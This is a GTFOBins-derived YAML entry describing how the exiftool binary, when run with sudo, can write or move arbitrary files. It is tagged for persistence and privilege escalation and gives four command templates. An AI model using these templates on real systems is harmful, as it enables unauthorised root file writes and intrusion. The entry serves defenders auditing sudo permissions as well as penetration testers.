id: gtfobins/exiftool/file-write/sudo
type: binary
platform: linux
name: exiftool
phases:
- persistence
- privilege-escalation
capabilities:
- file-write
privilege_required: sudo
sources:
- project: GTFOBins
  upstream_url: https://gtfobins.github.io
  license: GPL-3.0
  upstream_version: acd5246
  last_synced: '2026-08-25'
commands:
- template: exiftool -filename=/path/to/output-file /path/to/input-file
  comment: If the permissions allow it, files are moved (instead of copied) to the destination.
- template: exiftool "-description<=/path/to/input-file --filename /path/to/output-file
  comment: The output file must exists, either empty or be a supported image file. The content is written
    amidst other content.
- template: exiftool "-description=DATA --filename /path/to/output-file
  comment: The output file must exists, either empty or be a supported image file. The content is written
    amidst other content.
- template: exiftool -description -W /path/to/output-file --filename /path/to/input-file
  comment: Writes the metadata tags of the input file in textual format to the output.
references:
- https://gtfobins.github.io/gtfobins/exiftool/
tags:
- linux
- unix
- gtfobins
